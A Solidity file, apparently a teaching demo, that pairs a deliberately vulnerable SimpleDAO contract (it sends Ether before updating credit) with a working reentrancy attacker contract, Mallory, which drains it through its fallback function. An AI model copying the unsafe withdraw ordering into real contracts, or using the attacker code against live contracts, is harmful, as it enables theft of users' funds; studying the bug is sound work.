// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract SimpleDAO {
    mapping (address => uint) public credit;

    function donate(address to) 
        public 
        payable {
            credit[to] += msg.value;
    }

    function queryCredit(address to)
        public
        view
        returns(uint) {
            return credit[to];
        }

    function withdraw(uint amount)
        public {
            if(credit[msg.sender] >= amount) {
                (bool success, ) = msg.sender.call{value : amount}("");
                require(success, "Error : transaction failed");
                credit[msg.sender] -= amount;
            }
        }
    
    function getBalance()
        public 
        view 
        returns(uint) {
            return address(this).balance;
        }
}

contract Mallory {
    SimpleDAO public dao;
    address owner;

    constructor(SimpleDAO _dao) {
        dao = _dao;
        owner = msg.sender;
    }

    receive() 
        external 
        payable {
        if (address(dao).balance >= 1 ether) {
            dao.withdraw(dao.queryCredit(address(this))); // fallback에서 withdraw를 계속 호출함
        }
    }

    function getJackpot() public {
        payable(owner).transfer(address(this).balance);
    }

    function getBalance() 
        public 
        view 
        returns(uint) {
        return address(this).balance;
    }
}